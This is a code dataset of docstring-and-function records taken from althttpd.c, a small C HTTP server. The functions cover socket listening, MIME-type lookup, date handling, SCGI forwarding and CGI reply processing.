{"docstring": "/*\n** Implement an HTTP server daemon listening on port zPort.\n**\n** As new connections arrive, fork a child and let the child return\n** out of this procedure call.  The child will handle the request.\n** The parent never returns from this procedure.\n**\n** Return 0 to each child as it runs.  If unable to establish a\n** listening socket, return non-zero.\n*/\n", "func_signal": "int http_server(const char *zPort, int localOnly)", "code": "{\n  int listener[20];            /* The server sockets */\n  int connection;              /* A socket for each individual connection */\n  fd_set readfds;              /* Set of file descriptors for select() */\n  address inaddr;              /* Remote address */\n  socklen_t lenaddr;           /* Length of the inaddr structure */\n  int child;                   /* PID of the child process */\n  int nchildren = 0;           /* Number of child processes */\n  struct timeval delay;        /* How long to wait inside select() */\n  int opt = 1;                 /* setsockopt flag */\n  struct addrinfo sHints;      /* Address hints */\n  struct addrinfo *pAddrs, *p; /* */\n  int rc;                      /* Result code */\n  int i, n;\n  int maxFd = -1;\n  \n  memset(&sHints, 0, sizeof(sHints));\n  if( ipv4Only ){\n    sHints.ai_family = PF_INET;\n    /*printf(\"ipv4 only\\n\");*/\n  }else if( ipv6Only ){\n    sHints.ai_family = PF_INET6;\n    /*printf(\"ipv6 only\\n\");*/\n  }else{\n    sHints.ai_family = PF_UNSPEC;\n  }\n  sHints.ai_socktype = SOCK_STREAM;\n  sHints.ai_flags = AI_PASSIVE;\n  sHints.ai_protocol = 0;\n  rc = getaddrinfo(localOnly ? \"localhost\": 0, zPort, &sHints, &pAddrs);\n  if( rc ){\n    fprintf(stderr, \"could not get addr info: %s\", \n            rc!=EAI_SYSTEM ? gai_strerror(rc) : strerror(errno));\n    return 1;\n  }\n  for(n=0, p=pAddrs; n<(int)(sizeof(listener)/sizeof(listener[0])) && p!=0;\n        p=p->ai_next){\n    listener[n] = socket(p->ai_family, p->ai_socktype, p->ai_protocol);\n    if( listener[n]>=0 ){\n      /* if we can't terminate nicely, at least allow the socket to be reused */\n      setsockopt(listener[n], SOL_SOCKET, SO_REUSEADDR,&opt, sizeof(opt));\n      \n#if defined(IPV6_V6ONLY)\n      if( p->ai_family==AF_INET6 ){\n        int v6only = 1;\n        setsockopt(listener[n], IPPROTO_IPV6, IPV6_V6ONLY,\n                    &v6only, sizeof(v6only));\n      }\n#endif\n      \n      if( bind(listener[n], p->ai_addr, p->ai_addrlen)<0 ){\n        printf(\"bind failed: %s\\n\", strerror(errno));\n        close(listener[n]);\n        continue;\n      }\n      if( listen(listener[n], 20)<0 ){\n        printf(\"listen() failed: %s\\n\", strerror(errno));\n        close(listener[n]);\n        continue;\n      }\n      n++;\n    }\n  }\n  if( n==0 ){\n    fprintf(stderr, \"cannot open any sockets\\n\");\n    return 1;\n  }\n\n  while( 1 ){\n    if( nchildren>MAX_PARALLEL ){\n      /* Slow down if connections are arriving too fast */\n      sleep( nchildren-MAX_PARALLEL );\n    }\n    delay.tv_sec = 60;\n    delay.tv_usec = 0;\n    FD_ZERO(&readfds);\n    for(i=0; i<n; i++){\n      assert( listener[i]>=0 );\n      FD_SET( listener[i], &readfds);\n      if( listener[i]>maxFd ) maxFd = listener[i];\n    }\n    select( maxFd+1, &readfds, 0, 0, &delay);\n    for(i=0; i<n; i++){\n      if( FD_ISSET(listener[i], &readfds) ){\n        lenaddr = sizeof(inaddr);\n        connection = accept(listener[i], &inaddr.sa, &lenaddr);\n        if( connection>=0 ){\n          child = fork();\n          if( child!=0 ){\n            if( child>0 ) nchildren++;\n            close(connection);\n            /* printf(\"subprocess %d started...\\n\", child); fflush(stdout); */\n          }else{\n            int nErr = 0, fd;\n            close(0);\n            fd = dup(connection);\n            if( fd!=0 ) nErr++;\n            close(1);\n            fd = dup(connection);\n            if( fd!=1 ) nErr++;\n            close(connection);\n            return nErr;\n          }\n        }\n      }\n      /* Bury dead children */\n      while( (child = waitpid(0, 0, WNOHANG))>0 ){\n        /* printf(\"process %d ends\\n\", child); fflush(stdout); */\n        nchildren--;\n      }\n    }\n  }\n  /* NOT REACHED */  \n  exit(1);\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Guess the mime-type of a document based on its name.\n*/\n", "func_signal": "const char *GetMimeType(const char *zName, int nName)", "code": "{\n  const char *z;\n  int i;\n  int first, last;\n  int len;\n  char zSuffix[20];\n\n  /* A table of mimetypes based on file suffixes. \n  ** Suffixes must be in sorted order so that we can do a binary\n  ** search to find the mime-type\n  */\n  static const struct {\n    const char *zSuffix;       /* The file suffix */\n    int size;                  /* Length of the suffix */\n    const char *zMimetype;     /* The corresponding mimetype */\n  } aMime[] = {\n    { \"ai\",         2, \"application/postscript\"            },\n    { \"aif\",        3, \"audio/x-aiff\"                      },\n    { \"aifc\",       4, \"audio/x-aiff\"                      },\n    { \"aiff\",       4, \"audio/x-aiff\"                      },\n    { \"arj\",        3, \"application/x-arj-compressed\"      },\n    { \"asc\",        3, \"text/plain\"                        },\n    { \"asf\",        3, \"video/x-ms-asf\"                    },\n    { \"asx\",        3, \"video/x-ms-asx\"                    },\n    { \"au\",         2, \"audio/ulaw\"                        },\n    { \"avi\",        3, \"video/x-msvideo\"                   },\n    { \"bat\",        3, \"application/x-msdos-program\"       },\n    { \"bcpio\",      5, \"application/x-bcpio\"               },\n    { \"bin\",        3, \"application/octet-stream\"          },\n    { \"c\",          1, \"text/plain\"                        },\n    { \"cc\",         2, \"text/plain\"                        },\n    { \"ccad\",       4, \"application/clariscad\"             },\n    { \"cdf\",        3, \"application/x-netcdf\"              },\n    { \"class\",      5, \"application/octet-stream\"          },\n    { \"cod\",        3, \"application/vnd.rim.cod\"           },\n    { \"com\",        3, \"application/x-msdos-program\"       },\n    { \"cpio\",       4, \"application/x-cpio\"                },\n    { \"cpt\",        3, \"application/mac-compactpro\"        },\n    { \"csh\",        3, \"application/x-csh\"                 },\n    { \"css\",        3, \"text/css\"                          },\n    { \"dcr\",        3, \"application/x-director\"            },\n    { \"deb\",        3, \"application/x-debian-package\"      },\n    { \"dir\",        3, \"application/x-director\"            },\n    { \"dl\",         2, \"video/dl\"                          },\n    { \"dms\",        3, \"application/octet-stream\"          },\n    { \"doc\",        3, \"application/msword\"                },\n    { \"drw\",        3, \"application/drafting\"              },\n    { \"dvi\",        3, \"application/x-dvi\"                 },\n    { \"dwg\",        3, \"application/acad\"                  },\n    { \"dxf\",        3, \"application/dxf\"                   },\n    { \"dxr\",        3, \"application/x-director\"            },\n    { \"eps\",        3, \"application/postscript\"            },\n    { \"etx\",        3, \"text/x-setext\"                     },\n    { \"exe\",        3, \"application/octet-stream\"          },\n    { \"ez\",         2, \"application/andrew-inset\"          },\n    { \"f\",          1, \"text/plain\"                        },\n    { \"f90\",        3, \"text/plain\"                        },\n    { \"fli\",        3, \"video/fli\"                         },\n    { \"flv\",        3, \"video/flv\"                         },\n    { \"gif\",        3, \"image/gif\"                         },\n    { \"gl\",         2, \"video/gl\"                          },\n    { \"gtar\",       4, \"application/x-gtar\"                },\n    { \"gz\",         2, \"application/x-gzip\"                },\n    { \"hdf\",        3, \"application/x-hdf\"                 },\n    { \"hh\",         2, \"text/plain\"                        },\n    { \"hqx\",        3, \"application/mac-binhex40\"          },\n    { \"h\",          1, \"text/plain\"                        },\n    { \"htm\",        3, \"text/html; charset=utf-8\"          },\n    { \"html\",       4, \"text/html; charset=utf-8\"          },\n    { \"ice\",        3, \"x-conference/x-cooltalk\"           },\n    { \"ief\",        3, \"image/ief\"                         },\n    { \"iges\",       4, \"model/iges\"                        },\n    { \"igs\",        3, \"model/iges\"                        },\n    { \"ips\",        3, \"application/x-ipscript\"            },\n    { \"ipx\",        3, \"application/x-ipix\"                },\n    { \"jad\",        3, \"text/vnd.sun.j2me.app-descriptor\"  },\n    { \"jar\",        3, \"application/java-archive\"          },\n    { \"jpeg\",       4, \"image/jpeg\"                        },\n    { \"jpe\",        3, \"image/jpeg\"                        },\n    { \"jpg\",        3, \"image/jpeg\"                        },\n    { \"js\",         2, \"application/x-javascript\"          },\n    { \"kar\",        3, \"audio/midi\"                        },\n    { \"latex\",      5, \"application/x-latex\"               },\n    { \"lha\",        3, \"application/octet-stream\"          },\n    { \"lsp\",        3, \"application/x-lisp\"                },\n    { \"lzh\",        3, \"application/octet-stream\"          },\n    { \"m\",          1, \"text/plain\"                        },\n    { \"m3u\",        3, \"audio/x-mpegurl\"                   },\n    { \"man\",        3, \"application/x-troff-man\"           },\n    { \"me\",         2, \"application/x-troff-me\"            },\n    { \"mesh\",       4, \"model/mesh\"                        },\n    { \"mid\",        3, \"audio/midi\"                        },\n    { \"midi\",       4, \"audio/midi\"                        },\n    { \"mif\",        3, \"application/x-mif\"                 },\n    { \"mime\",       4, \"www/mime\"                          },\n    { \"movie\",      5, \"video/x-sgi-movie\"                 },\n    { \"mov\",        3, \"video/quicktime\"                   },\n    { \"mp2\",        3, \"audio/mpeg\"                        },\n    { \"mp2\",        3, \"video/mpeg\"                        },\n    { \"mp3\",        3, \"audio/mpeg\"                        },\n    { \"mpeg\",       4, \"video/mpeg\"                        },\n    { \"mpe\",        3, \"video/mpeg\"                        },\n    { \"mpga\",       4, \"audio/mpeg\"                        },\n    { \"mpg\",        3, \"video/mpeg\"                        },\n    { \"ms\",         2, \"application/x-troff-ms\"            },\n    { \"msh\",        3, \"model/mesh\"                        },\n    { \"nc\",         2, \"application/x-netcdf\"              },\n    { \"oda\",        3, \"application/oda\"                   },\n    { \"ogg\",        3, \"application/ogg\"                   },\n    { \"ogm\",        3, \"application/ogg\"                   },\n    { \"pbm\",        3, \"image/x-portable-bitmap\"           },\n    { \"pdb\",        3, \"chemical/x-pdb\"                    },\n    { \"pdf\",        3, \"application/pdf\"                   },\n    { \"pgm\",        3, \"image/x-portable-graymap\"          },\n    { \"pgn\",        3, \"application/x-chess-pgn\"           },\n    { \"pgp\",        3, \"application/pgp\"                   },\n    { \"pl\",         2, \"application/x-perl\"                },\n    { \"pm\",         2, \"application/x-perl\"                },\n    { \"png\",        3, \"image/png\"                         },\n    { \"pnm\",        3, \"image/x-portable-anymap\"           },\n    { \"pot\",        3, \"application/mspowerpoint\"          },\n    { \"ppm\",        3, \"image/x-portable-pixmap\"           },\n    { \"pps\",        3, \"application/mspowerpoint\"          },\n    { \"ppt\",        3, \"application/mspowerpoint\"          },\n    { \"ppz\",        3, \"application/mspowerpoint\"          },\n    { \"pre\",        3, \"application/x-freelance\"           },\n    { \"prt\",        3, \"application/pro_eng\"               },\n    { \"ps\",         2, \"application/postscript\"            },\n    { \"qt\",         2, \"video/quicktime\"                   },\n    { \"ra\",         2, \"audio/x-realaudio\"                 },\n    { \"ram\",        3, \"audio/x-pn-realaudio\"              },\n    { \"rar\",        3, \"application/x-rar-compressed\"      },\n    { \"ras\",        3, \"image/cmu-raster\"                  },\n    { \"ras\",        3, \"image/x-cmu-raster\"                },\n    { \"rgb\",        3, \"image/x-rgb\"                       },\n    { \"rm\",         2, \"audio/x-pn-realaudio\"              },\n    { \"roff\",       4, \"application/x-troff\"               },\n    { \"rpm\",        3, \"audio/x-pn-realaudio-plugin\"       },\n    { \"rtf\",        3, \"application/rtf\"                   },\n    { \"rtf\",        3, \"text/rtf\"                          },\n    { \"rtx\",        3, \"text/richtext\"                     },\n    { \"scm\",        3, \"application/x-lotusscreencam\"      },\n    { \"set\",        3, \"application/set\"                   },\n    { \"sgml\",       4, \"text/sgml\"                         },\n    { \"sgm\",        3, \"text/sgml\"                         },\n    { \"sh\",         2, \"application/x-sh\"                  },\n    { \"shar\",       4, \"application/x-shar\"                },\n    { \"silo\",       4, \"model/mesh\"                        },\n    { \"sit\",        3, \"application/x-stuffit\"             },\n    { \"skd\",        3, \"application/x-koan\"                },\n    { \"skm\",        3, \"application/x-koan\"                },\n    { \"skp\",        3, \"application/x-koan\"                },\n    { \"skt\",        3, \"application/x-koan\"                },\n    { \"smi\",        3, \"application/smil\"                  },\n    { \"smil\",       4, \"application/smil\"                  },\n    { \"snd\",        3, \"audio/basic\"                       },\n    { \"sol\",        3, \"application/solids\"                },\n    { \"spl\",        3, \"application/x-futuresplash\"        },\n    { \"src\",        3, \"application/x-wais-source\"         },\n    { \"step\",       4, \"application/STEP\"                  },\n    { \"stl\",        3, \"application/SLA\"                   },\n    { \"stp\",        3, \"application/STEP\"                  },\n    { \"sv4cpio\",    7, \"application/x-sv4cpio\"             },\n    { \"sv4crc\",     6, \"application/x-sv4crc\"              },\n    { \"svg\",        3, \"image/svg+xml\"                     },\n    { \"swf\",        3, \"application/x-shockwave-flash\"     },\n    { \"t\",          1, \"application/x-troff\"               },\n    { \"tar\",        3, \"application/x-tar\"                 },\n    { \"tcl\",        3, \"application/x-tcl\"                 },\n    { \"tex\",        3, \"application/x-tex\"                 },\n    { \"texi\",       4, \"application/x-texinfo\"             },\n    { \"texinfo\",    7, \"application/x-texinfo\"             },\n    { \"tgz\",        3, \"application/x-tar-gz\"              },\n    { \"tiff\",       4, \"image/tiff\"                        },\n    { \"tif\",        3, \"image/tiff\"                        },\n    { \"tr\",         2, \"application/x-troff\"               },\n    { \"tsi\",        3, \"audio/TSP-audio\"                   },\n    { \"tsp\",        3, \"application/dsptype\"               },\n    { \"tsv\",        3, \"text/tab-separated-values\"         },\n    { \"txt\",        3, \"text/plain\"                        },\n    { \"unv\",        3, \"application/i-deas\"                },\n    { \"ustar\",      5, \"application/x-ustar\"               },\n    { \"vcd\",        3, \"application/x-cdlink\"              },\n    { \"vda\",        3, \"application/vda\"                   },\n    { \"viv\",        3, \"video/vnd.vivo\"                    },\n    { \"vivo\",       4, \"video/vnd.vivo\"                    },\n    { \"vrml\",       4, \"model/vrml\"                        },\n    { \"vsix\",       4, \"application/vsix\"                  },\n    { \"wav\",        3, \"audio/x-wav\"                       },\n    { \"wax\",        3, \"audio/x-ms-wax\"                    },\n    { \"wiki\",       4, \"application/x-fossil-wiki\"         },\n    { \"wma\",        3, \"audio/x-ms-wma\"                    },\n    { \"wmv\",        3, \"video/x-ms-wmv\"                    },\n    { \"wmx\",        3, \"video/x-ms-wmx\"                    },\n    { \"wrl\",        3, \"model/vrml\"                        },\n    { \"wvx\",        3, \"video/x-ms-wvx\"                    },\n    { \"xbm\",        3, \"image/x-xbitmap\"                   },\n    { \"xlc\",        3, \"application/vnd.ms-excel\"          },\n    { \"xll\",        3, \"application/vnd.ms-excel\"          },\n    { \"xlm\",        3, \"application/vnd.ms-excel\"          },\n    { \"xls\",        3, \"application/vnd.ms-excel\"          },\n    { \"xlw\",        3, \"application/vnd.ms-excel\"          },\n    { \"xml\",        3, \"text/xml\"                          },\n    { \"xpm\",        3, \"image/x-xpixmap\"                   },\n    { \"xwd\",        3, \"image/x-xwindowdump\"               },\n    { \"xyz\",        3, \"chemical/x-pdb\"                    },\n    { \"zip\",        3, \"application/zip\"                   },\n  };\n\n  for(i=nName-1; i>0 && zName[i]!='.'; i--){}\n  z = &zName[i+1];\n  len = nName - i;\n  if( len<(int)sizeof(zSuffix)-1 ){\n    strcpy(zSuffix, z);\n    for(i=0; zSuffix[i]; i++) zSuffix[i] = tolower(zSuffix[i]);\n    first = 0;\n    last = sizeof(aMime)/sizeof(aMime[0]);\n    while( first<=last ){\n      int c;\n      i = (first+last)/2;\n      c = strcmp(zSuffix, aMime[i].zSuffix);\n      if( c==0 ) return aMime[i].zMimetype;\n      if( c<0 ){\n        last = i-1;\n      }else{\n        first = i+1;\n      }\n    }\n  }\n  return \"application/octet-stream\";\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Parse an RFC822-formatted timestamp as we'd expect from HTTP and return\n** a Unix epoch time. <= zero is returned on failure.\n*/\n", "func_signal": "time_t ParseRfc822Date(const char *zDate)", "code": "{\n  int mday, mon, year, yday, hour, min, sec;\n  char zIgnore[4];\n  char zMonth[4];\n  static const char *const azMonths[] =\n    {\"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\",\n     \"Jul\", \"Aug\", \"Sep\", \"Oct\", \"Nov\", \"Dec\"};\n  if( 7==sscanf(zDate, \"%3[A-Za-z], %d %3[A-Za-z] %d %d:%d:%d\", zIgnore,\n                       &mday, zMonth, &year, &hour, &min, &sec)){\n    if( year > 1900 ) year -= 1900;\n    for(mon=0; mon<12; mon++){\n      if( !strncmp( azMonths[mon], zMonth, 3 )){\n        int nDay;\n        int isLeapYr;\n        static int priorDays[] =\n         {  0, 31, 59, 90,120,151,181,212,243,273,304,334 };\n        isLeapYr = year%4==0 && (year%100!=0 || (year+300)%400==0);\n        yday = priorDays[mon] + mday - 1;\n        if( isLeapYr && mon>1 ) yday++;\n        nDay = (year-70)*365 + (year-69)/4 - year/100 + (year+300)/400 + yday;\n        return ((time_t)(nDay*24 + hour)*60 + min)*60 + sec;\n      }\n    }\n  }\n  return 0;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** This is called if we timeout or catch some other kind of signal.\n** Log an error code which is 900+iSig and then quit.\n*/\n", "func_signal": "static void Timeout(int iSig)", "code": "{\n  if( !debugFlag ){\n    if( zScript && zScript[0] ){\n      char zBuf[10];\n      zBuf[0] = '9';\n      zBuf[1] = '0' + (iSig/10)%10;\n      zBuf[2] = '0' + iSig%10;\n      zBuf[3] = 0;\n      strcpy(zReplyStatus, zBuf);\n      MakeLogEntry(0, 130);  /* LOG: Timeout */\n    }\n    exit(0);\n  }\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Send an SCGI request to a host identified by zFile and process the\n** reply.\n*/\n", "func_signal": "static void SendScgiRequest(const char *zFile, const char *zScript)", "code": "{\n  FILE *in;\n  FILE *s;\n  char *z;\n  char *zHost;\n  char *zPort = 0;\n  char *zRelight = 0;\n  char *zFallback = 0;\n  int rc;\n  int iSocket = -1;\n  struct addrinfo hints;\n  struct addrinfo *ai = 0;\n  struct addrinfo *p;\n  char *zHdr;\n  size_t nHdr = 0;\n  size_t nHdrAlloc;\n  int i;\n  char zLine[1000];\n  char zExtra[1000];\n  in = fopen(zFile, \"rb\");\n  if( in==0 ){\n    Malfunction(700, \"cannot open \\\"%s\\\"\\n\", zFile);\n  }\n  if( fgets(zLine, sizeof(zLine)-1, in)==0 ){\n    Malfunction(701, \"cannot read \\\"%s\\\"\\n\", zFile);\n  }\n  if( strncmp(zLine,\"SCGI \",5)!=0 ){\n    Malfunction(702, \"misformatted SCGI spec \\\"%s\\\"\\n\", zFile);\n  }\n  z = zLine+5;\n  zHost = GetFirstElement(z,&z);\n  zPort = GetFirstElement(z,0);\n  if( zHost==0 || zHost[0]==0 || zPort==0 || zPort[0]==0 ){\n    Malfunction(703, \"misformatted SCGI spec \\\"%s\\\"\\n\", zFile);\n  }\n  while( fgets(zExtra, sizeof(zExtra)-1, in) ){\n    char *zCmd = GetFirstElement(zExtra,&z);\n    if( zCmd==0 ) continue;\n    if( zCmd[0]=='#' ) continue;\n    RemoveNewline(z);\n    if( strcmp(zCmd, \"relight:\")==0 ){\n      free(zRelight);\n      zRelight = StrDup(z);\n      continue;\n    }\n    if( strcmp(zCmd, \"fallback:\")==0 ){\n      free(zFallback);\n      zFallback = StrDup(z);\n      continue;\n    }\n    Malfunction(704, \"unrecognized line in SCGI spec: \\\"%s %s\\\"\\n\",\n                zCmd, z ? z : \"\");\n  }\n  fclose(in);\n  memset(&hints, 0, sizeof(struct addrinfo));\n  hints.ai_family = AF_UNSPEC;\n  hints.ai_socktype = SOCK_STREAM;\n  hints.ai_protocol = IPPROTO_TCP;\n  rc = getaddrinfo(zHost,zPort,&hints,&ai);\n  if( rc ){\n    Malfunction(704, \"cannot resolve SCGI server name %s:%s\\n%s\\n\",\n                zHost, zPort, gai_strerror(rc));\n  }\n  while(1){  /* Exit via break */\n    for(p=ai; p; p=p->ai_next){\n      iSocket = socket(p->ai_family, p->ai_socktype, p->ai_protocol);\n      if( iSocket<0 ) continue;\n      if( connect(iSocket,p->ai_addr,p->ai_addrlen)>=0 ) break;\n      close(iSocket);\n    }\n    if( iSocket<0 || (s = fdopen(iSocket,\"r+\"))==0 ){\n      if( iSocket>=0 ) close(iSocket);\n      if( zRelight ){\n        rc = system(zRelight);\n        if( rc ){\n          Malfunction(721,\"Relight failed with %d: \\\"%s\\\"\\n\",\n                      rc, zRelight);\n        }\n        free(zRelight);\n        zRelight = 0;\n        sleep(1);\n        continue;\n      }\n      if( zFallback ){\n        struct stat statbuf;\n        int rc;\n        memset(&statbuf, 0, sizeof(statbuf));\n        if( chdir(zDir) ){\n          char zBuf[1000];\n          Malfunction(720, /* LOG: chdir() failed */\n               \"cannot chdir to [%s] from [%s]\", \n               zDir, getcwd(zBuf,999));\n        }\n        rc = stat(zFallback, &statbuf);\n        if( rc==0 && S_ISREG(statbuf.st_mode) && access(zFallback,R_OK)==0 ){\n          closeConnection = 1;\n          rc = SendFile(zFallback, (int)strlen(zFallback), &statbuf);\n          free(zFallback);\n          exit(0);\n        }else{\n          Malfunction(706, \"bad fallback file: \\\"%s\\\"\\n\", zFallback);\n        }\n      }\n      Malfunction(707, \"cannot open socket to SCGI server %s\\n\",\n                  zScript);\n    }\n    break;\n  }\n\n  nHdrAlloc = 0;\n  zHdr = 0;\n  if( zContentLength==0 ) zContentLength = \"0\";\n  zScgi = \"1\";\n  for(i=0; i<(int)(sizeof(cgienv)/sizeof(cgienv[0])); i++){\n    int n1, n2;\n    if( cgienv[i].pzEnvValue[0]==0 ) continue;\n    n1 = (int)strlen(cgienv[i].zEnvName);\n    n2 = (int)strlen(*cgienv[i].pzEnvValue);\n    if( n1+n2+2+nHdr >= nHdrAlloc ){\n      nHdrAlloc = nHdr + n1 + n2 + 1000;\n      zHdr = realloc(zHdr, nHdrAlloc);\n      if( zHdr==0 ){\n        Malfunction(706, \"out of memory\");\n      }\n    }\n    memcpy(zHdr+nHdr, cgienv[i].zEnvName, n1);\n    nHdr += n1;\n    zHdr[nHdr++] = 0;\n    memcpy(zHdr+nHdr, *cgienv[i].pzEnvValue, n2);\n    nHdr += n2;\n    zHdr[nHdr++] = 0;\n  }\n  zScgi = 0;\n  fprintf(s,\"%d:\",(int)nHdr);\n  fwrite(zHdr, 1, nHdr, s);\n  fprintf(s,\",\");\n  free(zHdr);\n  if( zMethod[0]=='P'\n   && atoi(zContentLength)>0 \n   && (in = fopen(zTmpNam,\"r\"))!=0 ){\n    size_t n;\n    while( (n = fread(zLine,1,sizeof(zLine),in))>0 ){\n      fwrite(zLine, 1, n, s);\n    }\n    fclose(in);\n  }\n  fflush(s);\n  CgiHandleReply(s);\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Count the number of \"/\" characters in a string.\n*/\n", "func_signal": "static int countSlashes(const char *z)", "code": "{\n  int n = 0;\n  while( *z ) if( *(z++)=='/' ) n++;\n  return n;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** A CGI or SCGI script has run and is sending its reply back across\n** the channel \"in\".  Process this reply into an appropriate HTTP reply.\n** Close the \"in\" channel when done.\n*/\n", "func_signal": "static void CgiHandleReply(FILE *in)", "code": "{\n  int seenContentLength = 0;   /* True if Content-length: header seen */\n  int contentLength = 0;       /* The content length */\n  size_t nRes = 0;             /* Bytes of payload */\n  size_t nMalloc = 0;          /* Bytes of space allocated to aRes */\n  char *aRes = 0;              /* Payload */\n  int c;                       /* Next character from in */\n  char *z;                     /* Pointer to something inside of zLine */\n  int iStatus = 0;             /* Reply status code */\n  char zLine[1000];            /* One line of reply from the CGI script */\n\n  if( useTimeout ){\n    /* Disable the timeout, so that we can implement Hanging-GET or\n    ** long-poll style CGIs.  The RLIMIT_CPU will serve as a safety\n    ** to help prevent a run-away CGI */\n    alarm(0);\n  }\n  while( fgets(zLine,sizeof(zLine),in) && !isspace((unsigned char)zLine[0]) ){\n    if( strncasecmp(zLine,\"Location:\",9)==0 ){\n      StartResponse(\"302 Redirect\");\n      RemoveNewline(zLine);\n      z = &zLine[10];\n      while( isspace(*(unsigned char*)z) ){ z++; }\n      nOut += printf(\"Location: %s\\r\\n\",z);\n      rangeEnd = 0;\n    }else if( strncasecmp(zLine,\"Status:\",7)==0 ){\n      int i;\n      for(i=7; isspace((unsigned char)zLine[i]); i++){}\n      nOut += printf(\"%s %s\", zProtocol, &zLine[i]);\n      strncpy(zReplyStatus, &zLine[i], 3);\n      zReplyStatus[3] = 0;\n      iStatus = atoi(zReplyStatus);\n      if( iStatus!=200 ) rangeEnd = 0;\n      statusSent = 1;\n    }else if( strncasecmp(zLine, \"Content-length:\", 15)==0 ){\n      seenContentLength = 1;\n      contentLength = atoi(zLine+15);\n    }else{\n      size_t nLine = strlen(zLine);\n      if( nRes+nLine >= nMalloc ){\n        nMalloc += nMalloc + nLine*2;\n        aRes = realloc(aRes, nMalloc+1);\n        if( aRes==0 ){\n          Malfunction(600, \"Out of memory: %d bytes\", nMalloc);\n        }\n      }\n      memcpy(aRes+nRes, zLine, nLine);\n      nRes += nLine;\n    }\n  }\n\n  /* Copy everything else thru without change or analysis.\n  */\n  if( rangeEnd>0 && seenContentLength && rangeStart<contentLength ){\n    StartResponse(\"206 Partial Content\");\n    if( rangeEnd>=contentLength ){\n      rangeEnd = contentLength-1;\n    }\n    nOut += printf(\"Content-Range: bytes %d-%d/%d\\r\\n\",\n                    rangeStart, rangeEnd, contentLength);\n    contentLength = rangeEnd + 1 - rangeStart;\n  }else{\n    StartResponse(\"200 OK\");\n  }\n  if( nRes>0 ){\n    aRes[nRes] = 0;\n    printf(\"%s\", aRes);\n    nOut += nRes;\n    nRes = 0;\n  }\n  if( iStatus==304 ){\n    nOut += printf(\"\\r\\n\\r\\n\");\n  }else if( seenContentLength ){\n    nOut += printf(\"Content-length: %d\\r\\n\\r\\n\", contentLength);\n    xferBytes(in, stdout, contentLength, rangeStart);\n  }else{\n    while( (c = getc(in))!=EOF ){\n      if( nRes>=nMalloc ){\n        nMalloc = nMalloc*2 + 1000;\n        aRes = realloc(aRes, nMalloc+1);\n        if( aRes==0 ){\n           Malfunction(610, \"Out of memory: %d bytes\", nMalloc);\n        }\n      }\n      aRes[nRes++] = c;\n    }\n    if( nRes ){\n      aRes[nRes] = 0;\n      nOut += printf(\"Content-length: %d\\r\\n\\r\\n%s\", (int)nRes, aRes);\n    }else{\n      nOut += printf(\"Content-length: 0\\r\\n\\r\\n\");\n    }\n  }\n  free(aRes);\n  fclose(in);\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Print the first line of a response followed by the server type.\n*/\n", "func_signal": "static void StartResponse(const char *zResultCode)", "code": "{\n  time_t now;\n  time(&now);\n  if( statusSent ) return;\n  nOut += printf(\"%s %s\\r\\n\", zProtocol, zResultCode);\n  strncpy(zReplyStatus, zResultCode, 3);\n  zReplyStatus[3] = 0;\n  if( zReplyStatus[0]>='4' ){\n    closeConnection = 1;\n  }\n  if( closeConnection ){\n    nOut += printf(\"Connection: close\\r\\n\");\n  }else{\n    nOut += printf(\"Connection: keep-alive\\r\\n\");\n  }\n  nOut += DateTag(\"Date\", now);\n  statusSent = 1;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/* Render seconds since 1970 as an RFC822 date string.  Return\n** a pointer to that string in a static buffer.\n*/\n", "func_signal": "static char *Rfc822Date(time_t t)", "code": "{\n  struct tm *tm;\n  static char zDate[100];\n  tm = gmtime(&t);\n  strftime(zDate, sizeof(zDate), \"%a, %d %b %Y %H:%M:%S %Z\", tm);\n  return zDate;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Remove the first space-delimited token from a string and return\n** a pointer to it.  Add a NULL to the string to terminate the token.\n** Make *zLeftOver point to the start of the next token.\n*/\n", "func_signal": "static char *GetFirstElement(char *zInput, char **zLeftOver)", "code": "{\n  char *zResult = 0;\n  if( zInput==0 ){\n    if( zLeftOver ) *zLeftOver = 0;\n    return 0;\n  }\n  while( isspace(*(unsigned char*)zInput) ){ zInput++; }\n  zResult = zInput;\n  while( *zInput && !isspace(*(unsigned char*)zInput) ){ zInput++; }\n  if( *zInput ){\n    *zInput = 0;\n    zInput++;\n    while( isspace(*(unsigned char*)zInput) ){ zInput++; }\n  }\n  if( zLeftOver ){ *zLeftOver = zInput; }\n  return zResult;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Double any double-quote characters in a string.\n*/\n", "func_signal": "static char *Escape(char *z)", "code": "{\n  size_t i, j;\n  size_t n;\n  char c;\n  char *zOut;\n  for(i=0; (c=z[i])!=0 && c!='\"'; i++){}\n  if( c==0 ) return z;\n  n = 1;\n  for(i++; (c=z[i])!=0; i++){ if( c=='\"' ) n++; }\n  zOut = malloc( i+n+1 );\n  if( zOut==0 ) return \"\";\n  for(i=j=0; (c=z[i])!=0; i++){\n    zOut[j++] = c;\n    if( c=='\"' ) zOut[j++] = c;\n  }\n  zOut[j] = 0;\n  return zOut;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
